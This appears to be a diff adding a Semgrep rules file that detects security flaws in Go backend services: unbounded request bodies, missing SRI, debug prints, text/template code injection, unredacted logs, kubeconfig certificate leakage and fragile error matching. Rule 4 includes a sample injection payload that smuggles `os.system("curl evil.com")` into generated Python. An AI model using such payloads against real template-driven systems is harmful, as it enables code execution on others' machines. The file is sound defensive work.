@@ -1,0 +1,421 @@
+# Semgrep Rules: RHOAI BFF Security Patterns
+# Category: Backend-for-Frontend (BFF) service security
+# Target: Go BFF services (gen-ai, automl, autorag, mlflow)
+#
+# These rules detect security issues found by adversarial code review
+# of the ODH Dashboard BFF packages. They cover patterns that the
+# existing SAST rules miss: request body limits, template injection,
+# logging gaps, credential leakage, and debug code.
+#
+# Origin: Adversarial Security Review 2026-04-08 (SEC-001 through SEC-017)
+
+rules:
+  # ═══════════════════════════════════════════════════════════════════════
+  # Rule 1: Unbounded JSON Request Body (SEC-001)
+  # Detects json.NewDecoder(r.Body).Decode() without MaxBytesReader
+  # ═══════════════════════════════════════════════════════════════════════
+  - id: rhoai-unbounded-json-request-body
+    pattern: json.NewDecoder($REQ.Body).Decode(...)
+    paths:
+      exclude:
+        - "*_test.go"
+        - "**/*_test.go"
+        - "**/testutil/**"
+    message: |
+      JSON request body decoded without http.MaxBytesReader size limit.
+
+      VULNERABILITY: An attacker can send an arbitrarily large JSON payload,
+      consuming server memory until the process is OOM-killed. This is a
+      denial-of-service vector.
+
+      If the codebase has a centralized ReadJSON helper that applies
+      MaxBytesReader, use that instead of raw json.NewDecoder.
+
+      REMEDIATION:
+      ```go
+      // BEFORE (VULNERABLE):
+      var req MyRequest
+      json.NewDecoder(r.Body).Decode(&req)
+
+      // AFTER (SECURE):
+      r.Body = http.MaxBytesReader(w, r.Body, 1_048_576) // 1 MB
+      dec := json.NewDecoder(r.Body)
+      dec.DisallowUnknownFields()
+      if err := dec.Decode(&req); err != nil {
+          // handle error
+      }
+
+      // OR use a centralized helper:
+      if err := app.ReadJSON(w, r, &req); err != nil {
+          // handle error
+      }
+      ```
+
+      REFERENCES:
+      - CWE-400: Uncontrolled Resource Consumption
+      - CWE-770: Allocation of Resources Without Limits
+    severity: WARNING
+    languages: [go]
+    metadata:
+      category: security
+      technology: [http, json]
+      cwe: "CWE-400"
+      confidence: HIGH
+      likelihood: MEDIUM
+      impact: HIGH
+      subcategory: [vuln]
+
+  # ═══════════════════════════════════════════════════════════════════════
+  # Rule 2: CDN Script/Link Without Subresource Integrity (SEC-002)
+  # Detects external JS/CSS loaded without integrity= attribute
+  # ═══════════════════════════════════════════════════════════════════════
+  - id: rhoai-cdn-without-sri
+    pattern-either:
+      - pattern-regex: '<script\s+[^>]*src\s*=\s*["\x27]https?://[^"\x27]+["\x27][^>]*(?!integrity)[^>]*>'
+      - pattern-regex: '<link\s+[^>]*href\s*=\s*["\x27]https?://[^"\x27]+["\x27][^>]*(?!integrity)[^>]*>'
+    message: |
+      External script or stylesheet loaded from CDN without Subresource
+      Integrity (SRI) hash.
+
+      VULNERABILITY: If the CDN is compromised or DNS-poisoned, an attacker
+      can inject arbitrary JavaScript that executes in the context of your
+      application's origin. This can steal authentication tokens, session
+      data, or perform actions as the authenticated user.
+
+      REMEDIATION:
+      Add integrity and crossorigin attributes:
+
+      ```html
+      <!-- BEFORE (VULNERABLE): -->
+      <script src="https://cdn.example.com/lib.js"></script>
+
+      <!-- AFTER (SECURE): -->
+      <script src="https://cdn.example.com/lib.js"
+              integrity="sha384-<hash>"
+              crossorigin="anonymous"></script>
+      ```
+
+      Generate SRI hashes with: `shasum -b -a 384 lib.js | awk '{ print $1 }' | xxd -r -p | base64`
+
+      BEST PRACTICE: Bundle assets locally instead of loading from CDN.
+
+      REFERENCES:
+      - CWE-829: Inclusion of Functionality from Untrusted Control Sphere
+      - MDN: Subresource Integrity
+    severity: WARNING
+    languages: [generic]
+    metadata:
+      category: security
+      technology: [html, cdn]
+      cwe: "CWE-829"
+      confidence: HIGH
+      likelihood: LOW
+      impact: HIGH
+      subcategory: [vuln]
+
+  # ═══════════════════════════════════════════════════════════════════════
+  # Rule 3: Debug Print Statements in Production Code (SEC-004)
+  # Detects fmt.Print/fmt.Println/fmt.Printf in non-test Go files
+  # ═══════════════════════════════════════════════════════════════════════
+  - id: rhoai-debug-print-in-production
+    pattern-either:
+      - pattern: fmt.Println(...)
+      - pattern: fmt.Printf(...)
+      - pattern: fmt.Print(...)
+    message: |
+      Debug print statement found in production code.
+
+      VULNERABILITY: fmt.Print/Println/Printf writes directly to stdout
+      without structured logging, log levels, or header redaction. In a
+      container environment, stdout goes to container logs which may be
+      collected by centralized logging systems with broad read access.
+
+      Debug print statements can leak:
+      - Internal service URLs and topology
+      - Request/response data
+      - Authentication tokens (if in URL query params)
+
+      REMEDIATION:
+      Use the application's structured logger instead:
+
+      ```go
+      // BEFORE (VULNERABLE):
+      fmt.Println(fullURL)
+
+      // AFTER (SECURE):
+      logger.Debug("upstream request", "url", fullURL)
+      ```
+
+      REFERENCES:
+      - CWE-532: Insertion of Sensitive Information into Log File
+      - CWE-489: Active Debug Code
+    severity: WARNING
+    languages: [go]
+    paths:
+      exclude:
+        - "*_test.go"
+        - "**/*_test.go"
+        - "**/testutil/**"
+        - "**/testdata/**"
+        - "**/cmd/main.go"
+    metadata:
+      category: security
+      technology: [logging]
+      cwe: "CWE-489"
+      confidence: MEDIUM
+      likelihood: MEDIUM
+      impact: MEDIUM
+      subcategory: [vuln]
+
+  # ═══════════════════════════════════════════════════════════════════════
+  # Rule 4: Go text/template With User Input (SEC-014)
+  # Detects code generation using text/template (no auto-escaping)
+  # ═══════════════════════════════════════════════════════════════════════
+  - id: rhoai-text-template-code-injection
+    patterns:
+      - pattern-either:
+          - pattern: text_template.New(...).Parse(...)
+          - pattern: template.New(...).Parse(...)
+          - pattern: template.Must(template.New(...).Parse(...))
+      - pattern-not-inside: |
+          import "html/template"
+          ...
+    message: |
+      Go text/template used for output generation. Unlike html/template,
+      text/template performs NO automatic escaping of interpolated values.
+
+      VULNERABILITY: If user-supplied data is interpolated into the template,
+      an attacker can inject arbitrary content. When generating code (Python,
+      shell, SQL, etc.), this enables code injection in the generated output.
+
+      ATTACK EXAMPLE (Python code generation):
+      If a template contains: `input_text = "{{.Input}}"`
+      And user sends Input: `"; import os; os.system("curl evil.com"); x="`
+      The output is valid Python with injected commands.
+
+      REMEDIATION:
+      ```go
+      // Option 1: Escape user input before template execution
+      func escapePythonString(s string) string {
+          s = strings.ReplaceAll(s, `\`, `\\`)
+          s = strings.ReplaceAll(s, `"`, `\"`)
+          s = strings.ReplaceAll(s, "\n", `\n`)
+          return s
+      }
+
+      // Option 2: Use JSON serialization for user values
+      jsonInput, _ := json.Marshal(userInput)
+      // Template: input_text = {{.JSONInput}}
+
+      // Option 3: Use html/template if generating HTML/web content
+      import "html/template"
+      ```
+
+      REFERENCES:
+      - CWE-94: Improper Control of Generation of Code (Code Injection)
+      - CWE-116: Improper Encoding or Escaping of Output
+    severity: WARNING
+    languages: [go]
+    paths:
+      exclude:
+        - "*_test.go"
+        - "**/*_test.go"
+    metadata:
+      category: security
+      technology: [template, codegen]
+      cwe: "CWE-94"
+      confidence: MEDIUM
+      likelihood: MEDIUM
+      impact: HIGH
+      subcategory: [vuln]
+
+  # ═══════════════════════════════════════════════════════════════════════
+  # Rule 5: Response Body Logged Without Redaction (SEC-015)
+  # Detects logging of HTTP response bodies that may contain PII
+  # ═══════════════════════════════════════════════════════════════════════
+  - id: rhoai-response-body-in-logs
+    pattern-either:
+      - pattern: slog.Any("body", $RESP.Body)
+      - pattern: slog.String("body", string($RESP.Body))
+      - pattern: $LOGGER.Debug(..., "body", $RESP.Body, ...)
+      - pattern: $LOGGER.Info(..., "body", $RESP.Body, ...)
+      - pattern: $LOGGER.Warn(..., "body", $RESP.Body, ...)
+      - pattern: $LOGGER.Error(..., "body", $RESP.Body, ...)
+    message: |
+      HTTP response body logged without redaction.
+
+      VULNERABILITY: Response bodies from upstream services (LLMs, model
+      registries, inference endpoints) can contain:
+      - User prompts and chat history (PII)
+      - Generated content echoing sensitive input
+      - Authentication tokens and API keys
+      - Documents uploaded to vector stores
+
+      If request bodies are already redacted in logs (common pattern),
+      response bodies should receive the same treatment.
+
+      REMEDIATION:
+      ```go
+      // BEFORE (VULNERABLE):
+      slog.Any("body", response.Body)
+
+      // AFTER (SECURE):
+      slog.String("body", "[REDACTED for privacy]")
+
+      // OR truncate for debugging:
+      bodyPreview := string(response.Body)
+      if len(bodyPreview) > 100 {
+          bodyPreview = bodyPreview[:100] + "...[truncated]"
+      }
+      slog.String("body_preview", bodyPreview)
+      ```
+
+      REFERENCES:
+      - CWE-532: Insertion of Sensitive Information into Log File
+      - GDPR Article 5(1)(f): Data minimization
+    severity: WARNING
+    languages: [go]
+    metadata:
+      category: security
+      technology: [logging, privacy]
+      cwe: "CWE-532"
+      confidence: HIGH
+      likelihood: MEDIUM
+      impact: HIGH
+      subcategory: [vuln]
+
+  # ═══════════════════════════════════════════════════════════════════════
+  # Rule 6: rest.CopyConfig Without Clearing Client Certificates (SEC-008)
+  # Detects kubeconfig copy that may leak elevated credentials
+  # ═══════════════════════════════════════════════════════════════════════
+  - id: rhoai-kubeconfig-cert-leak
+    patterns:
+      - pattern: rest.CopyConfig($BASE)
+      - pattern-not-inside: |
+          $CFG = rest.CopyConfig($BASE)
+          ...
+          $CFG.CertData = nil
+          ...
+      - pattern-not-inside: |
+          $CFG := rest.CopyConfig($BASE)
+          ...
+          $CFG.CertData = nil
+          ...
+      - pattern-not-inside: |
+          $CFG = rest.CopyConfig($BASE)
+          ...
+          $CFG.TLSClientConfig.CertData = nil
+          ...
+      - pattern-not-inside: |
+          $CFG := rest.CopyConfig($BASE)
+          ...
+          $CFG.TLSClientConfig.CertData = nil
+          ...
+    message: |
+      rest.CopyConfig copies ALL fields from the base kubeconfig, including
+      TLS client certificates (CertData, CertFile, KeyData, KeyFile).
+
+      VULNERABILITY: If the base kubeconfig uses client certificate
+      authentication (common in dev environments and some cluster configs),
+      those credentials survive the copy. When a user-provided bearer token
+      is set on the copied config, the resulting client authenticates with
+      BOTH the token AND the client certificate. The Kubernetes API server
+      may grant the client cert's identity (potentially cluster-admin)
+      instead of the user token's identity.
+
+      REMEDIATION:
+      After rest.CopyConfig, explicitly clear all client certificate fields:
+
+      ```go
+      cfg := rest.CopyConfig(baseConfig)
+      cfg.BearerToken = userToken
+
+      // Clear ALL auth mechanisms from base config
+      cfg.BearerTokenFile = ""
+      cfg.Username = ""
+      cfg.Password = ""
+      cfg.ExecProvider = nil
+      cfg.AuthProvider = nil
+
+      // CRITICAL: Also clear client certificates
+      cfg.TLSClientConfig.CertData = nil
+      cfg.TLSClientConfig.CertFile = ""
+      cfg.TLSClientConfig.KeyData = nil
+      cfg.TLSClientConfig.KeyFile = ""
+      ```
+
+      REFERENCES:
+      - CWE-269: Improper Privilege Management
+      - CWE-522: Insufficiently Protected Credentials
+    severity: WARNING
+    languages: [go]
+    metadata:
+      category: security
+      technology: [kubernetes, authentication]
+      cwe: "CWE-269"
+      confidence: MEDIUM
+      likelihood: LOW
+      impact: HIGH
+      subcategory: [vuln]
+
+  # ═══════════════════════════════════════════════════════════════════════
+  # Rule 7: K8s Error Classification via String Matching (SEC-017)
+  # Detects fragile error handling that should use apierrors.Is*
+  # ═══════════════════════════════════════════════════════════════════════
+  - id: rhoai-k8s-error-string-matching
+    pattern-either:
+      - pattern: strings.Contains($ERR.Error(), "not found")
+      - pattern: strings.Contains($ERR.Error(), "forbidden")
+      - pattern: strings.Contains($ERR.Error(), "unauthorized")
+      - pattern: strings.Contains($ERR.Error(), "already exists")
+      - pattern: strings.Contains($ERR.Error(), "conflict")
+      - pattern: strings.Contains($ERR.Error(), "404")
+      - pattern: strings.Contains($ERR.Error(), "403")
+      - pattern: strings.Contains($ERR.Error(), "409")
+      - pattern: strings.Contains($ERR.Error(), "401")
+    message: |
+      Kubernetes API error classified by string matching instead of using
+      the typed error helpers from apimachinery.
+
+      VULNERABILITY: String matching on error messages is fragile and
+      locale-dependent. It can misclassify errors (e.g., "model not found
+      in registry" would match "not found" even though it's not a K8s 404).
+      Misclassified errors can lead to incorrect error handling, information
+      leakage, or security bypass.
+
+      REMEDIATION:
+      Use the typed error helpers from k8s.io/apimachinery:
+
+      ```go
+      import apierrors "k8s.io/apimachinery/pkg/api/errors"
+
+      // BEFORE (FRAGILE):
+      if strings.Contains(err.Error(), "not found") {
+          // handle 404
+      }
+
+      // AFTER (CORRECT):
+      if apierrors.IsNotFound(err) {
+          // handle 404
+      } else if apierrors.IsForbidden(err) {
+          // handle 403
+      } else if apierrors.IsAlreadyExists(err) {
+          // handle 409
+      } else if apierrors.IsUnauthorized(err) {
+          // handle 401
+      }
+      ```
+
+      REFERENCES:
+      - CWE-755: Improper Handling of Exceptional Conditions
+      - CWE-390: Detection of Error Condition Without Action
+    severity: WARNING
+    languages: [go]
+    metadata:
+      category: security
+      technology: [kubernetes, error-handling]
+      cwe: "CWE-755"
+      confidence: HIGH
+      likelihood: MEDIUM
+      impact: MEDIUM
+      subcategory: [vuln]
